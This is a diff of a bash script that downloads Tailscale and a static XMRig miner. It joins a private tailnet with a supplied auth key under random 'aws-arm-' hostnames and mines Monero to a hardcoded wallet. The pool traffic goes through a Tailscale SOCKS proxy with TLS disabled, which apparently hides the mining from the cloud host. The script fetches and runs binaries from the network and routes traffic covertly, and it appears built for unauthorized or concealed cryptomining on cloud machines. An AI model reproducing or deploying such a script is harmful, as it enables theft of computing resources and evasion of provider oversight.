@@ -1,14 +1,50 @@
-# 1. Capture the key from the command line or environment
+#!/bin/bash
+
+# --- CONFIGURATION ---
+# This line grabs the key you pass in the command line
 TS_KEY="${TS_KEY:-$1}"
 
-# Optional: Stop if no key is found (prevents wasted downloads)
 if [ -z "$TS_KEY" ]; then
-    echo "Error: No TS_KEY provided."
+    echo "ERROR: No TS_KEY provided. Use: TS_KEY='your-key' ./script2.sh"
     exit 1
 fi
 
-wget https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-aarch64-static && \
-chmod +x xmrig-aarch64-static && \
-chmod +x ./start.sh && \
+# IMPORTANT: Replace this with your Docker container's 100.x.x.x IP
+DOCKER_PROXY_IP="100.65.155.105" 
+WALLET="85RcBrmqpB2TboWNtPUEzTLR5QVqZSiTPdq1fTiGdwvmC5E2rUzovKqArdYToBEZWz3qxthgoi2n41SJHJPN9amC9HCQbk8"
 
-TS_KEY="$TS_KEY" ./start.sh
+# 1. DOWNLOAD TAILSCALE (ARM64)
+if [ ! -f "./tailscale" ]; then
+    echo "Downloading Tailscale for ARM64..."
+    wget -q https://pkgs.tailscale.com/stable/tailscale_latest_arm64.tgz
+    tar xzf tailscale_latest_arm64.tgz --strip-components=1
+    chmod +x tailscale tailscaled
+fi
+
+# 2. DOWNLOAD MINER (If not already there)
+if [ ! -f "./xmrig-aarch64-static" ]; then
+    echo "Downloading XMRig for ARM64..."
+    wget https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-aarch64-static
+    chmod +x xmrig-aarch64-static
+fi
+
+# Cleanup old sessions
+pkill -f tailscaled
+rm -f ts.state ts.sock
+
+echo "Starting Tailscale..."
+./tailscaled --tun=userspace-networking --socket=ts.sock --state=ts.state --socks5-server=localhost:1055 &
+sleep 5
+
+echo "Connecting to Tailnet..."
+./tailscale --socket=ts.sock up --authkey="$TS_KEY" --hostname="aws-arm-$RANDOM" --accept-dns=false
+sleep 5
+
+echo "Launching XMRig..."
+./xmrig-aarch64-static \
+  -c config.json \
+  -o "$DOCKER_PROXY_IP:9999" \
+  -u "$WALLET" \
+  --proxy "127.0.0.1:1055" \
+  --no-tls \
+  --rig-id "aws-$(hostname)"
